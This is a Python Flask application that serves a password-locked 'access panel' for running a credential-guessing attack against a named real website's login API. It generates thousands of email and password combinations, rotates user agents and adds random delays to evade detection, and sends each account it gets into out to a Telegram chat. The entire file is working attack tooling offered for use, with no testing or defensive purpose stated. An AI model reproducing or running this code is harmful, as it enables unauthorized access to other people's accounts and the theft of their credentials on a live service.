# app.py
from flask import Flask, request, render_template_string, session, redirect, url_for, jsonify
import requests
import time
import random
import threading
import string
from telegram import Bot
from telegram.error import TelegramError

app = Flask(__name__)
app.secret_key = 'supersecretkey'

PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# Telegram settings
bot_token = ""
chat_id = ""

# Attack state
stop_flag = False
valid_accounts = []
valid_count = 0
invalid_count = 0
current_guess = ""
finished = False
attack_thread = None

# Generate random email + password (derived from email)
def generate_random_creds():
    local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 12)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
    email = f"{local}@{domain}.com"
    
    patterns = [
        local,
        local + "123",
        local + "!",
        local + "@" + domain[:3],
        domain[:3] + local[:3],
        local[::-1],
        local.upper(),
        local + str(random.randint(100, 999)),
        "P@ss" + local[:4],
        local + "2024",
    ]
    password = random.choice(patterns)
    if random.random() > 0.6:
        password += random.choice(["!", "@", "#", "123", "456"])
    return email, password

combos = [generate_random_creds() for _ in range(3000)]

# HTML Template - Elegant, premium, modern tech style
TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access · Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0b1219 0%, #141e2a 100%);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }
        .glass {
            background: rgba(20, 30, 42, 0.70);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(72, 120, 180, 0.25);
            border-radius: 32px;
            padding: 36px 40px;
            width: 94%;
            max-width: 700px;
            box-shadow: 0 25px 60px rgba(0,0,0,0.7), 0 0 0 1px rgba(72, 180, 255, 0.05) inset;
            transition: 0.3s;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(72, 150, 220, 0.15);
            padding-bottom: 16px;
            margin-bottom: 28px;
            flex-wrap: wrap;
        }
        .title {
            font-weight: 600;
            font-size: 1.5rem;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #8fcbff, #4a9eff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .badge {
            background: rgba(72, 150, 220, 0.12);
            border: 1px solid rgba(72, 150, 220, 0.20);
            padding: 4px 16px;
            border-radius: 40px;
            font-size: 0.7rem;
            font-weight: 500;
            color: #7aa9d9;
            letter-spacing: 0.5px;
        }
        .input-group {
            margin: 16px 0;
        }
        .input-group label {
            display: block;
            font-size: 0.7rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: #7a9fc9;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(10, 18, 28, 0.6);
            border: 1px solid rgba(72, 150, 220, 0.20);
            border-radius: 14px;
            color: #d0e4f5;
            font-family: 'Inter', sans-serif;
            font-size: 0.9rem;
            transition: 0.25s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #4a9eff;
            box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.15);
            background: rgba(10, 18, 28, 0.8);
        }
        .btn {
            border: none;
            padding: 12px 22px;
            border-radius: 40px;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: 0.25s;
            letter-spacing: 0.3px;
            background: rgba(40, 70, 110, 0.3);
            color: #c0ddf5;
            border: 1px solid rgba(72, 150, 220, 0.15);
            backdrop-filter: blur(4px);
        }
        .btn:hover { transform: translateY(-2px); filter: brightness(1.15); }
        .btn-primary { background: #2a6a9a; color: white; border-color: #3a8ac0; }
        .btn-success { background: #1e7a4a; color: white; border-color: #2a9a5a; }
        .btn-danger { background: #8a2a3a; color: white; border-color: #ba3a4a; }
        .btn-warning { background: #8a7a1a; color: white; border-color: #baaa2a; }
        .btn-outline { background: transparent; border-color: rgba(72, 150, 220, 0.25); }
        .flex-row {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .flex-row .btn { flex: 1; min-width: 100px; justify-content: center; display: flex; align-items: center; }
        .status-panel {
            background: rgba(10, 20, 32, 0.5);
            border-radius: 16px;
            padding: 14px 20px;
            margin: 18px 0;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            border: 1px solid rgba(72, 150, 220, 0.08);
            font-size: 0.75rem;
            color: #8aafcf;
        }
        .status-panel .val { color: #d0e4f5; font-weight: 600; }
        .status-panel .valid { color: #5fcf9a; }
        .status-panel .invalid { color: #e07a7a; }
        #results-box {
            background: rgba(10, 20, 32, 0.4);
            border-radius: 14px;
            padding: 14px 18px;
            height: 145px;
            overflow-y: auto;
            font-size: 0.8rem;
            color: #c0ddf5;
            white-space: pre-wrap;
            word-break: break-all;
            border: 1px solid rgba(72, 150, 220, 0.06);
            margin-top: 4px;
            font-family: 'Inter', monospace;
        }
        #results-box::-webkit-scrollbar { width: 4px; }
        #results-box::-webkit-scrollbar-track { background: rgba(10, 20, 32, 0.2); }
        #results-box::-webkit-scrollbar-thumb { background: #2a5a7a; border-radius: 20px; }
        .test-msg {
            background: rgba(10, 20, 32, 0.3);
            border-radius: 10px;
            padding: 6px 14px;
            font-size: 0.7rem;
            color: #7a9fc9;
            border-left: 3px solid #3a7a9a;
            margin-top: 6px;
        }
        .test-msg.success { border-left-color: #2a9a5a; color: #8fdaa0; }
        .test-msg.error { border-left-color: #ba3a4a; color: #e07a7a; }
        .footer {
            margin-top: 24px;
            padding-top: 14px;
            border-top: 1px solid rgba(72, 150, 220, 0.06);
            text-align: center;
            color: #3a5a7a;
            font-size: 0.6rem;
            letter-spacing: 0.8px;
        }
        .inline-flex { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        @media (max-width: 500px) { .glass { padding: 24px 18px; } }
    </style>
</head>
<body>
<div class="glass">
    <div class="header">
        <span class="title">◆ access panel</span>
        <span class="badge">secured · v3</span>
    </div>

    {% if not logged %}
    <!-- LOGIN -->
    <div class="input-group">
        <label>master key</label>
        <form method="POST" action="/login">
            <input type="password" name="password" placeholder="enter password" required>
            <button type="submit" class="btn btn-primary" style="width:100%; margin-top:14px;">unlock</button>
        </form>
    </div>
    <div style="text-align:center; margin-top:10px; color:#3a5a7a; font-size:0.65rem;">restricted area</div>
    {% else %}
    <!-- MAIN -->
    <div class="input-group">
        <label>telegram config</label>
        <form method="POST" action="/set_telegram" style="display:flex; gap:10px; flex-wrap:wrap;">
            <input type="text" name="bot_token" placeholder="bot token" value="{{ bot_token }}" style="flex:2; min-width:130px;">
            <input type="text" name="chat_id" placeholder="chat id" value="{{ chat_id }}" style="flex:1; min-width:80px;">
            <button type="submit" class="btn btn-warning" style="flex:0 1 auto; width:auto; padding:12px 20px;">update</button>
        </form>
        <div class="inline-flex" style="margin-top:6px;">
            <button onclick="testTelegram()" class="btn btn-outline" style="width:auto; padding:6px 18px; font-size:0.7rem;">test</button>
            <div id="testResult" class="test-msg" style="flex:1;">not tested</div>
        </div>
    </div>

    <div class="flex-row">
        <button onclick="startAttack()" class="btn btn-success">start</button>
        <button onclick="stopAttack()" class="btn btn-danger">abort</button>
    </div>

    <div class="status-panel">
        <span>status: <span class="val" id="status">idle</span></span>
        <span class="valid">valid: <span id="valid">0</span></span>
        <span class="invalid">invalid: <span id="invalid">0</span></span>
        <span>current: <span class="val" id="current">-</span></span>
        <span>total: <span class="val">{{ total }}</span></span>
    </div>

    <div>
        <label style="font-size:0.65rem; font-weight:600; text-transform:uppercase; letter-spacing:0.8px; color:#7a9fc9;">valid accounts</label>
        <div id="results-box"></div>
    </div>

    <div class="footer">[ zero retention · encrypted channel ]</div>

    <script>
        function testTelegram() {
            const token = document.querySelector('input[name="bot_token"]').value;
            const chat = document.querySelector('input[name="chat_id"]').value;
            fetch('/test_telegram', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({token, chat_id: chat})
            })
            .then(r => r.json())
            .then(d => {
                const el = document.getElementById('testResult');
                if (d.status === 'ok') {
                    el.className = 'test-msg success';
                    el.innerText = '[+] connection successful';
                } else {
                    el.className = 'test-msg error';
                    el.innerText = '[-] ' + (d.error || 'invalid token or chat');
                }
            });
        }
        function startAttack() {
            fetch('/start', { method: 'POST' })
            .then(r => r.json())
            .then(d => document.getElementById('status').innerText = 'running');
        }
        function stopAttack() {
            fetch('/stop', { method: 'POST' })
            .then(r => r.json())
            .then(d => document.getElementById('status').innerText = 'aborted');
        }
        setInterval(() => {
            fetch('/results')
            .then(r => r.json())
            .then(d => {
                document.getElementById('valid').innerText = d.valid || 0;
                document.getElementById('invalid').innerText = d.invalid || 0;
                document.getElementById('current').innerText = d.current || '-';
                document.getElementById('results-box').innerHTML = d.valid_accounts.map(a => '▸ ' + a).join('<br>');
                if (d.finished) document.getElementById('status').innerText = 'completed';
            });
        }, 1200);
    </script>
    {% endif %}
</div>
</body>
</html>
"""

# ---------- Routes ----------
@app.route('/')
def index():
    if session.get('logged_in'):
        return render_template_string(TEMPLATE, logged=True, bot_token=bot_token, chat_id=chat_id, total=len(combos))
    return render_template_string(TEMPLATE, logged=False)

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('password') == PASSWORD:
        session['logged_in'] = True
    return redirect(url_for('index'))

@app.route('/set_telegram', methods=['POST'])
def set_telegram():
    global bot_token, chat_id
    if session.get('logged_in'):
        bot_token = request.form.get('bot_token', '').strip()
        chat_id = request.form.get('chat_id', '').strip()
    return redirect(url_for('index'))

@app.route('/test_telegram', methods=['POST'])
def test_telegram():
    if not session.get('logged_in'):
        return jsonify({'status': 'error', 'error': 'unauthorized'})
    data = request.json
    token = data.get('token', '').strip()
    chat = data.get('chat_id', '').strip()
    if not token or not chat:
        return jsonify({'status': 'error', 'error': 'missing token or chat'})
    try:
        Bot(token=token).send_message(chat_id=chat, text="[test] connection successful.")
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/start', methods=['POST'])
def start():
    global stop_flag, valid_count, invalid_count, valid_accounts, finished, current_guess, attack_thread
    if not session.get('logged_in'):
        return jsonify({'status': 'error'})
    stop_flag = False
    finished = False
    valid_count = 0
    invalid_count = 0
    valid_accounts = []
    current_guess = ""
    if attack_thread and attack_thread.is_alive():
        return jsonify({'status': 'already running'})
    attack_thread = threading.Thread(target=attack_worker)
    attack_thread.daemon = True
    attack_thread.start()
    return jsonify({'status': 'started'})

@app.route('/stop', methods=['POST'])
def stop():
    global stop_flag
    if session.get('logged_in'):
        stop_flag = True
    return jsonify({'status': 'stopped'})

@app.route('/results')
def results():
    if not session.get('logged_in'):
        return jsonify({})
    return jsonify({
        'valid': valid_count,
        'invalid': invalid_count,
        'current': current_guess,
        'valid_accounts': valid_accounts[-100:],
        'finished': finished
    })

# ---------- Attack Engine ----------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

def check_login(email, password):
    try:
        s = requests.Session()
        r = s.post('https://www.fun-box.vip/api/login',
                   data={'email': email, 'password': password},
                   headers={'User-Agent': random.choice(USER_AGENTS)},
                   timeout=10,
                   allow_redirects=False)
        return 'success' in r.text.lower() or 'dashboard' in r.text.lower()
    except:
        return False

def attack_worker():
    global valid_count, invalid_count, valid_accounts, current_guess, finished, stop_flag, combos
    for email, password in combos:
        if stop_flag:
            break
        current_guess = f"{email}:{password}"
        if check_login(email, password):
            valid_count += 1
            acc = f"{email}:{password}"
            valid_accounts.append(acc)
            if bot_token and chat_id:
                try:
                    Bot(token=bot_token).send_message(chat_id=chat_id, text=f"VALID: {acc}")
                except:
                    pass
        else:
            invalid_count += 1
        time.sleep(random.uniform(0.8, 2.0))
    finished = True
    current_guess = "done"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3030, debug=False)
